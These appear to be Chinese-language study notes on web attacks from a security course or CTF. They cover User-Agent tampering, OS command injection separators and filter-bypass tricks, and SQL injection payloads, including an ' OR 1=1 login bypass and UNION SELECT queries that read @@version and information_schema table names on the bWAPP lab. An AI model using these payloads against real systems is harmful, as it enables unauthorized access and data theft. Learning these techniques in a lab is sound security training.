如果要塞flag的話..

![image](https://user-images.githubusercontent.com/96654161/182135844-c2240eeb-b33d-4921-bf3e-9916baa374b4.png)


### HTTP Header 竄改

這題要通過竄改User-Agent

![image](https://user-images.githubusercontent.com/96654161/182141988-573330f4-abf9-4d66-b74f-1c8067f3c15f.png)

https://www.whatismybrowser.com/guides/the-latest-user-agent/android

拿其中一個測試，對User-Agent做更改

`Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.129 Mobile Safari/537.36.`


![image](https://user-images.githubusercontent.com/96654161/182141636-cfd96b9c-fd4c-43df-b432-a52f047b31bb.png)

![image](https://user-images.githubusercontent.com/96654161/182141683-1a8a14c3-8bcd-444f-b3c9-b4e2534bc758.png)

### Injection
攻擊者透過輸入資料內加入惡意語句，改變網站行為，達到惡意目的

+ OS Command Injection
  + 後端直接丟給 Shell 處理
  + 可以在正常輸入後面走私其他 Shell Script 進去讓他執行
  + 善用 `|` 、 `||` 、 `&` 、 `&&` 、 `;` 、 `>` 、 `$()` 、 ` 、 `#` 、 `${IFS}` 、去掉空白等等手法繞過檢查
![image](https://user-images.githubusercontent.com/96654161/182142877-9e93acea-6242-4a8d-ae21-e7ceae12cc5a.png)

![image](https://user-images.githubusercontent.com/96654161/182145372-4f0b7aed-0bd4-4d6f-95a9-24f50b9b306e.png)

+ SQL Injection
  + 後端拿使用者輸入的資料做 SQL 查詢
  + 後端將攻擊者挾帶進去的 SQL 語句當作正常 SQL 語句的一部份，改變原本 SQL 查詢行為

SQL 語句不分大小寫

  - SELECT 、 select 、 Select 、 sEleCt 
  - 所以你可以注入 ‘ oR is_aDmIn=trUe -- ’

不過 Table/Column name 不一定不分大小寫

  - SELECT * FROM users Where name=’admin’;
  - SELECT * FROM uSErs Where name=’admin’;
  
Column Value 也不一定不分大小寫

  - SELECT * FROM users Where name=’Alice’;
  - SELECT * FROM users Where name=’alICe’;


+ DBMS
  + 管理資料庫的軟體
  + 負責取資料庫中的資料、以及管理資料庫各項事務
  + 常見有 MySQL 、 PostgreSQL 、 Oracle 、 Microsoft SQL-Server 等
  
![image](https://user-images.githubusercontent.com/96654161/182147782-337dd371-4a68-4ea6-ade1-841c39d3a87e.png)

`SELECT * FROM users WHERE name='輸入Ａ' AND pwd='輸入Ｂ';` 

塞入payload

`SELECT * FROM users WHERE name='foo' AND pwd=' ' OR 1=1 -- ' ';`

`SELECT * FROM users WHERE name='foo' AND pwd=' ' OR 1=1 -- ' ';`

> ` -- ` 是 SQL 註解

### 善用註解
![image](https://user-images.githubusercontent.com/96654161/182149330-c0d5ec87-4f30-45fd-9381-e5771e4011a4.png)

### 善用字串
![image](https://user-images.githubusercontent.com/96654161/182150785-59b13c02-e7d3-4296-8334-497097aa779a.png)

### Union Based SQLi
每個 SELECT 語句 Column 數要一樣

=> 可以用來測試該查詢語句的 column 數

=> 可以用來偷其他 table 的資料或其他資訊

1. ' UNION SELECT NULL,NULL ......, NULL -- '
2. ' UNION SELECT 1,2, ......, n -- '
3. ' UNION SELECT 1,2, ... @@version, ..., n --'

+ SELECT * FROM movies WHERE title LIKE '%' UNION SELECT NULL,NULL, ......,NULL --'%'

+ SELECT * FROM movies WHERE title LIKE '%' UNION SELECT 1,2, ......, n --'%'

+ SELECT * FROM moviesm WHERE title LIKE '%' UNION SELECT 1,2, ... ,@@version, ..., n --'%'

information_schema
+ Mysql 內建儲存 Database/Table/Column 名稱、存取權限等等資料的 Database
+ 關於 information_schema: https://blog.johnsonlu.org/mysql-information_schema/

bWAPP SQL Injection (GET/Search)

' UNION SELECT 1,2,...,GROUP_CONCAT(TABLE_SCHEMA),...,n FROM information_schema.TABLES WHERE TABLE_SCHEMA NOT LIKE "%schema" LIMIT 30 ; -- '
